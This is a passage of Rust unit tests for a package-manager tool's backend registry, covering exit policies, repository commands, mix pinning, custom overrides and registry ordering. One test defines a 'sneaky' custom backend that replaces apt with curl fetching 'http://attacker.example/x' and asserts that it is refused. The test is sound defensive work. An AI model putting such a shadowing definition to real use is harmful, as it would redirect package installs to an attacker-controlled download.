    /// line; every argv assertion stayed green and `cargo install <no-such-crate>` silently
    /// stopped being classified `permanent`, which sends the sweep harness back to retrying a
    /// crate that will never exist. Two integration tests caught it after the fact. This is the
    /// same check one layer down, so the next conversion fails here first.
    #[test]
    fn a_generic_backend_carries_its_managers_exit_policy() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        // Filtered on the predicate, not on a hand-written list: `helm` has a policy entry
        // that carries benign exit codes and no absent markers, so asserting it "classifies"
        // asserts something untrue about helm rather than something true about the wiring.
        let known: Vec<&str> = argv_cases()
            .iter()
            .map(|c| c.backend)
            .filter(|n| crate::core::exit_policy::classifies_absent_names(n))
            .collect();
        assert!(
            known.len() >= 5,
            "only {} backends classify absent names — the filter is broken, not the code",
            known.len()
        );
        for name in known {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let exec =
                CommandExecutor::with_layer(true, false, mock, vfs, Arc::new(DashMap::new()));
            assert!(
                !exec.classifies_absent_names(),
                "the bare executor already classifies, so this test proves nothing"
            );
            let core = Arc::new(GenericBackendCore {
                name: name.to_string(),
                executor: exec,
                config: base_config(name),
                parser: Arc::new(LambdaParser {
                    installed_fn: |_| Ok(vec![]),
                    search_fn: |_| vec![],
                }),
            });
            assert!(
                with_manager_policy(core).executor.classifies_absent_names(),
                "`{name}` has an entry in exit_policy::for_manager and did not carry it. A                  manager that cannot say \"no such package\" leaves the line in the manifest                  and every later command fails on it."
            );
        }
    }

    /// This module's own source, which is a **directory**: `mod.rs` plus one file per manager
    /// family.
    ///
    /// A source scan inside the thing it scans, so it moved when the thing did. The
    /// `pub(super) ` is normalised away because it is an artifact of the split — a registrar
    /// that had to become visible to its parent module is the same registrar it was, and a scan
    /// keyed on a visibility modifier breaks on a refactor that changed nothing it watches.
    fn registry_source() -> String {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/backends/registry");
        let mut files: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
            .expect("the registry directory is readable")
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().is_some_and(|x| x == "rs"))
            .collect();
        files.sort();
        assert!(!files.is_empty(), "the registry directory holds no source");
        files
            .iter()
            .map(|p| std::fs::read_to_string(p).unwrap_or_default())
            .collect::<Vec<_>>()
            .join(
                "
",
            )
            .replace("pub(super) fn ", "fn ")
    }

    /// Every registrar that builds a core routes it through [`with_manager_policy`].
    ///
    /// **The test above cannot catch this and was green while it was broken.** It calls
    /// `with_manager_policy` *inside its own assertion*, so it proves the helper works and never
    /// asks whether any registrar calls it. `register_scoop`, `register_winget` and
    /// `register_choco` did not, so the three main Windows backends ran on
    /// `ExitPolicy::default()`: `scoop install <no-such-package>` came back `unknown`, Q1 never
    /// withdrew the line, and the leftover then failed ten of thirteen checks in one sweep.
    ///
    /// A source scan because the defect is a **missing line** — the same reason
    /// `tests/prompt_guard_tests.rs` is one. A registrar added tomorrow joins this test on its
    /// own, which is the only property that keeps the class from coming back.
    #[test]
    fn every_registrar_gives_its_core_the_managers_exit_policy() {
        let src = registry_source();

        let mut missing: Vec<String> = Vec::new();
        let mut checked = 0usize;
        let mut current: Option<(String, Vec<&str>)> = None;

        for line in src.lines() {
            if let Some(rest) = line.strip_prefix("fn register_") {
                let name = rest.split('(').next().unwrap_or("").to_string();
                current = Some((format!("register_{name}"), Vec::new()));
            } else if line == "}" {
                if let Some((name, body)) = current.take() {
                    let builds = body.iter().any(|l| l.contains("GenericBackendCore {"));
                    if builds {
                        checked += 1;
                        // Two ways to be right, and delegating is the better one:
                        // `register_generic` applies the policy for every backend routed
                        // through it. Only a registrar that calls `reg.register` itself has
                        // to say so, and those are exactly the ones that forgot.
                        let ok = body.iter().any(|l| {
                            l.contains("with_manager_policy") || l.contains("register_generic(")
                        });
                        if !ok {
                            missing.push(name);
                        }
                    }
                }
            } else if let Some((_, body)) = current.as_mut() {
                body.push(line);
            }
        }

        // Without this the scan passes on a file it stopped matching — the shape of check this
        // whole test exists to replace.
        assert!(
            checked >= 3,
            "the scan found only {checked} registrar(s) building a core; it has stopped matching \
             the code it audits"
        );
        assert!(
            missing.is_empty(),
            "these registrars build a core without its manager's exit policy, so the backend \
             cannot tell a name that does not exist from a dropped network — and for a manager \
             that exits 0 on failure, cannot tell failure from success at all:\n  {}",
            missing.join("\n  ")
        );
    }

    /// The table must not name one backend twice: the second row would silently replace the
    /// first in a reader's mind while both ran, and a contradiction between them would show up
    /// as a flake rather than a failure.
    #[test]
    fn no_backend_has_two_argv_rows() {
        let mut seen: Vec<&str> = argv_cases().iter().map(|c| c.backend).collect();
        let before = seen.len();
        seen.sort_unstable();
        seen.dedup();
        assert_eq!(
            before,
            seen.len(),
            "a backend has two rows in the argv table"
        );
    }

    /// The leading word of a repository command is a program, and for two backends it was a
    /// subcommand of a manager that has no such subcommand — `apt add-apt-repository …` and
    /// `apk sh -c …`. Both fail on any real host, so `repo add`/`repo remove` had never worked
    /// on apt or apk. This is `every_os_native_backend_sends_the_argv_its_manager_expects` for
    /// the repository surface, and it exists because that test covered install and remove only.
    #[tokio::test]
    async fn every_repo_row_runs_the_program_that_edits_that_managers_sources() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;

        type Registrar = fn(&mut BackendRegistry, &CommandExecutor);
        // backend, registrar, the program `repo add` must run, the program `repo list` must run.
        let cases: &[(&str, Registrar, &str, Option<&str>)] = &[
            ("apt", register_apt, "add-apt-repository", None),
            ("apk", register_apk, "sh", Some("cat")),
            ("zypper", register_zypper, "zypper", None),
            ("winget", register_winget, "winget", Some("winget")),
            ("scoop", register_scoop, "scoop", Some("scoop")),
            ("choco", register_choco, "choco", Some("choco")),
            ("gem", register_gem, "gem", Some("gem")),
        ];

        for (name, register, want_write, want_read) in cases {
            let vfs = Arc::new(DashMap::new());
            let mock = Arc::new(MockExecutor::new(vfs.clone()));
            let exec = CommandExecutor::with_layer(
                true,
                false,
                mock.clone(),
                vfs,
                Arc::new(DashMap::new()),
            );
            let mut reg = BackendRegistry::new();
            register(&mut reg, &exec);
            let b = reg
                .get(name)
                .unwrap_or_else(|| panic!("{} did not register", name));
            let mgr = b
                .as_repo_manager()
                .unwrap_or_else(|| panic!("{} manages no repositories", name));

            let _ = mgr
                .add_repo("shalltest", "https://example.invalid/repo", false)
                .await;
            if want_read.is_some() {
                let _ = mgr.list_repos().await;
            }
            let calls = mock.get_calls().await;
            assert!(
                calls
                    .iter()
                    .any(|c| c.split_whitespace().next() == Some(want_write)),
                "{}: repo add ran none of the right program `{}`\n  calls: {:?}",
                name,
                want_write,
                calls
            );
            if let Some(read) = want_read {
                assert!(
                    calls
                        .iter()
                        .any(|c| c.split_whitespace().next() == Some(read)),
                    "{}: repo list ran none of the right program `{}`\n  calls: {:?}",
                    name,
                    read,
                    calls
                );
            }
        }
    }

    /// Both halves of what the `tools` image measured on 2026-07-29, in one place because they
    /// are one lifecycle: a mix archive that cannot be pinned cannot be installed at all on an
    /// older Elixir, and a removal without `--force` reports success and removes nothing.
    ///
    /// ```text
    /// $ mix archive.install hex --force phx_new          -> supports only Elixir ~> 1.17 (exit 1)
    /// $ mix archive.install hex --force phx_new 1.6.16   -> creating /root/.mix/archives/phx_new-1.6.16
    /// $ mix archive.uninstall phx_new  </dev/null        -> `Are you sure…? [Yn]`, exit 0, STILL INSTALLED
    /// $ mix archive.uninstall --force -- phx_new         -> gone
    /// ```
    ///
    /// The option terminator is Shall's, and it was measured rather than assumed: both of the
    /// commands above were run in that exact shape, because two managers in this tree turned
    /// out to read `--` as a package name (W25) and mix does not.
    /// ```
    #[tokio::test]
    async fn a_mix_archive_is_pinnable_and_its_removal_does_not_wait_for_an_answer() {
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;
        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        register_mix(&mut reg, &exec);
        let mix = reg.get("mix").expect("mix is registered");
        let inst = mix.as_installable().expect("installs");

        inst.install(
            &[crate::core::PackageSpec {
                name: "phx_new".into(),
                backend: "mix".into(),
                options: [("version", "1.6.16")].into_iter().collect(),
                ..Default::default()
            }],
            false,
        )
        .await
        .unwrap();
        inst.remove(
            &["phx_new".to_string()],
            false,
            crate::app::sync::guard::Reaped::for_reason(
                crate::app::sync::guard::GuardScope::Remove,
                "a unit test of the effector itself",
            ),
        )
        .await
        .unwrap();

        let calls = mock.get_calls().await;
        // **Behind the terminator, both of them.** mix's version is a bare operand, so `--`
        // protects it exactly as it protects the name; the pin used to be labelled a *flag*,
        // which gave the terminator up on every pinned install and kept it on every unpinned
        // one. Measured, `tools` image 2026-08-04: `mix archive.install hex --force --
        // <name> <version>` is identical to the same line without the terminator (Q30).
        assert!(
            calls
                .iter()
                .any(|c| c == "mix archive.install hex --force -- phx_new 1.6.16"),
            "the pinned version never reached mix: {:?}",
            calls
        );
        assert!(
            calls
                .iter()
                .any(|c| c == "mix archive.uninstall --force -- phx_new"),
            "the removal would sit on a prompt and report success: {:?}",
            calls
        );
    }

    /// Q6, the case the key exists for: a manager changes its CLI, and the person on that
    /// machine corrects it that day instead of waiting for a Shall release.
    #[tokio::test]
    async fn a_definition_that_says_so_replaces_a_built_in() {
        use crate::backends::onboarder::{register_custom_backends, CustomBackendDef};
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;
        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        register_apt(&mut reg, &exec);

        let mine = CustomBackendDef {
            name: "apt".into(),
            binary: Some("apt-fast".into()),
            install_args: vec!["install".into(), "--assume-yes".into()],
            remove_args: vec!["remove".into()],
            list_args: vec!["list".into()],
            overrides: true,
            ..Default::default()
        };
        assert_eq!(register_custom_backends(&mut reg, &exec, vec![mine]), 1);

        reg.get("apt")
            .expect("apt is still registered")
            .as_installable()
            .expect("installs")
            .install(
                &[crate::core::PackageSpec {
                    name: "jq".into(),
                    backend: "apt".into(),
                    ..Default::default()
                }],
                false,
            )
            .await
            .unwrap();

        let calls = mock.get_calls().await;
        assert!(
            calls.iter().any(|c| c.starts_with("apt-fast install")),
            "the user's definition did not win: {:?}",
            calls
        );
        assert!(
            !calls.iter().any(|c| c.starts_with("apt-get ")),
            "the built-in was still driving the install: {:?}",
            calls
        );
    }

    /// The default: a definition that does not say so leaves the built-in alone. Picking the
    /// name `apt` is not a way to become `apt`.
    #[tokio::test]
    async fn a_definition_that_does_not_say_so_leaves_the_built_in_alone() {
        use crate::backends::onboarder::{register_custom_backends, CustomBackendDef};
        use crate::core::executor::MockExecutor;
        use dashmap::DashMap;
        let vfs = Arc::new(DashMap::new());
        let mock = Arc::new(MockExecutor::new(vfs.clone()));
        let exec =
            CommandExecutor::with_layer(true, false, mock.clone(), vfs, Arc::new(DashMap::new()));
        let mut reg = BackendRegistry::new();
        register_apt(&mut reg, &exec);

        let sneaky = CustomBackendDef {
            name: "apt".into(),
            binary: Some("curl".into()),
            install_args: vec!["http://attacker.example/x".into()],
            list_args: vec!["list".into()],
            ..Default::default()
        };
        assert_eq!(register_custom_backends(&mut reg, &exec, vec![sneaky]), 0);

        reg.get("apt")
            .expect("apt survived")
            .as_installable()
            .expect("installs")
            .install(
                &[crate::core::PackageSpec {
                    name: "jq".into(),
                    backend: "apt".into(),
                    ..Default::default()
                }],
                false,
            )
            .await
            .unwrap();
        assert!(
            !mock
                .get_calls()
                .await
                .iter()
                .any(|c| c.starts_with("curl ")),
            "the shadowing definition ran anyway"
        );
    }

    /// Two walks of the registry give the same order, and it is one a reader can predict.
    ///
    /// It was a `HashMap`, so the order was Rust's per-process hash seed: `shall list` printed
    /// its backend blocks in a different sequence every run — two runs a second apart differed
    /// by 530 lines and sorted identical — and the fan-outs handed their first slots to
    /// whichever managers the seed happened to name first, so no timing measurement repeated.
    ///
    /// Asserted against a *sorted copy*, not against a recorded list, so the test says "in an
    /// order somebody can predict" rather than pinning today's set of backend names.
    #[tokio::test]
    async fn every_walk_of_the_registry_is_in_the_same_order() {
        let reg = build_registry().await;
        let names = |bs: Vec<std::sync::Arc<BackendCapabilities>>| {
            bs.iter().map(|b| b.name().to_string()).collect::<Vec<_>>()
        };

        let first = names(reg.all());
        assert_eq!(first, names(reg.all()), "two walks, two orders");
        let mut sorted = first.clone();
        sorted.sort();
        assert_eq!(first, sorted, "the order is not one a reader can predict");

        // `available()` filters the same walk, so it inherits the same guarantee — and it is
        // the one every listing command actually calls.
        let avail = names(reg.present_on_this_machine());
        let mut avail_sorted = avail.clone();
        avail_sorted.sort();
        assert_eq!(avail, avail_sorted);
    }

    /// U39, at the wiring rather than in `generic`: the registered `helm` is the one that has
    /// to refuse a plugin declared without its source, because a plugin installed under the
    /// wrong identity is one nothing can remove afterwards.
    #[tokio::test]
    async fn a_helm_plugin_declared_without_its_url_is_refused_by_name() {
        let reg = build_registry().await;
        let helm = reg.get("helm").expect("helm is registered");
        let inst = helm.as_installable().expect("helm installs");
        let spec = crate::core::PackageSpec {
            name: "diff".into(),
            backend: "helm".into(),
            ..Default::default()
        };
        let msg = inst.install(&[spec], false).await.unwrap_err().to_string();
        assert!(msg.contains("helm:diff@url="), "{}", msg);
    }

    /// Q36, pinned at the wiring: **adoption reads winget's export, never its listing.**
    ///
    /// `winget list` reports every Add/Remove-Programs and MSIX row with an identifier winget
    /// synthesises from the registry — 186 of 280 on the measured host. `winget uninstall`
    /// takes those; `winget install` answers `No package found matching input criteria` for
    /// every one, and a third of them carry their own version, so the name changes under the
    /// declaration when the package updates. Reverting this to `AllInstalled` reads as a
    /// simplification and silently replants 186 lines that can never converge.
    #[tokio::test]
    async fn winget_adoption_reads_what_it_can_reinstall_not_what_it_can_see() {
        let reg = build_registry().await;
        let Some(winget) = reg.get("winget") else {
            return; // not this machine's platform
        };
        let src = winget
            .as_queryable()
            .expect("winget answers questions")
            .manual_source();
        assert!(
            src.contains("export"),
            "winget adoption no longer goes through `winget export`: {src}"
        );
        assert!(
            !src.starts_with("everything "),
            "winget adoption is back on the whole listing, which includes 186 identifiers \
             `winget install` refuses: {src}"
        );
    }

    /// The other half of the same rule, asked of every backend rather than of winget.
    ///
    /// `AllInstalled` asserts two things at once — the manager invents no dependencies **and**
    /// it can reinstall everything it lists — and winget was filed under it because only the
    /// first was ever checked. Whether each *other* manager on that list satisfies the second
    /// is unverified and is the open sweep; this pins the one answer that is measured, so a
    /// tidy-up cannot quietly put winget back.
    #[tokio::test]
    async fn winget_is_not_among_the_managers_that_adopt_their_whole_listing() {
        let reg = build_registry().await;
        let from_listing: Vec<String> = reg
            .present_on_this_machine()
            .iter()
            .filter(|b| {
                b.as_queryable()
                    .is_some_and(|q| q.manual_source().starts_with("everything "))
            })
            .map(|b| b.name().to_string())
            .collect();
        assert!(
            !from_listing.iter().any(|n| n == "winget"),
            "winget adopts from its listing again (Q36): {from_listing:?}"
        );
    }

    /// `Dependents::apply_through_backend` and `Extras::undo_extra` both refuse when the backend
    /// behind a `service:` / `link:` / `setting:` line turns out not to be installable. Both used
    /// to *return success* there instead — a declared line applied to nothing, an undo reported
    /// as done, and in `undo_extra`'s case the extras lock cleared afterwards, so the resource
    /// was forgotten while still in effect.
    ///
    /// This is the other end of that pair: the refusal should be unreachable, because these three
    /// keywords are only ever registered by backends that can write. If registering a new
    /// settings adapter without an `Installable` impl ever makes it reachable, this fails here —
    /// at build time, with the keyword named — rather than at apply time on a user's machine.
    #[tokio::test]
    async fn the_keyword_backends_can_all_do_the_thing_their_keyword_names() {
        let reg = build_registry().await;
        for keyword in ["service", "link", "setting"] {
            let Some(b) = reg.get(keyword) else {
                continue; // not available on this platform; the apply path warns and skips
            };
            assert!(
                b.as_installable().is_some(),
                "`{keyword}:` is registered but not installable, so every `{keyword}:` line \
                 in a manifest now refuses instead of applying"
            );
        }
    }
}
